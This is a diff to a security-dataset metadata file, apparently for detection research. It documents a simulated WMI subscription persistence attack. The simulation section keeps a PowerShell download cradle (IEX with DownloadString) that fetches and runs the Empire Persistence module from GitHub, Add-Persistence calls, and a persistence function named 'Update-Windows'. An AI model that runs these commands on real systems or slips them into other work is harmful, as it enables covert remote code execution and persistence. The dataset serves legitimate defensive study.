@@ -31,17 +31,11 @@ datasets:
       link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-WMISubscriptionCreation-Elevated/WORKSTATION6_Windows_MicrosoftWindowsWMIActivityOperational.zip
 
 simulation:
-  environment: Blacksmith
-  tools:
-    - type: Manual
-      name: PowerShell
-      module: PowerShell
-      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
-  permissions_required:
-    - Administrator
-  adversary_view: |-
-    Adversary Box
-    -------------
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1
+  supportingFileUris:
+  commands: |-
+    # Adversary Box
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/persistence/Persistence.psm1')
     
     $InvokeWhoami= { Invoke-Expression whoami }
@@ -49,13 +43,11 @@ simulation:
     $UserOptions = New-UserPersistenceOption -Registry -AtLogon
     Add-Persistence -ScriptBlock $InvokeWhoami -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
 
-    Victim Box
-    ----------
-    Open a non-elevated PowerShell session
-    Run the contents of the script (Persistence.ps1) created in the previous steps
+    # Victim Box
+    # Open a non-elevated PowerShell session
+    # Run the contents of the script (Persistence.ps1) created in the previous steps
 
-    FILE:
-    -----
+    # FILE
     function Update-Windows{
     Param([Switch]$Persist)
     $ErrorActionPreference='SilentlyContinue'
@@ -73,8 +65,8 @@ simulation:
     {$Script.Invoke()}
     } Update-Windows -Persist
 
-    Run
-    ---
-    PS C:\Windows\system32>.\Persistence.ps1
-    PS C:\Windows\system32>
-references:
+    #Run
+    .\Persistence.ps1
+  output: |-
+
+detection:
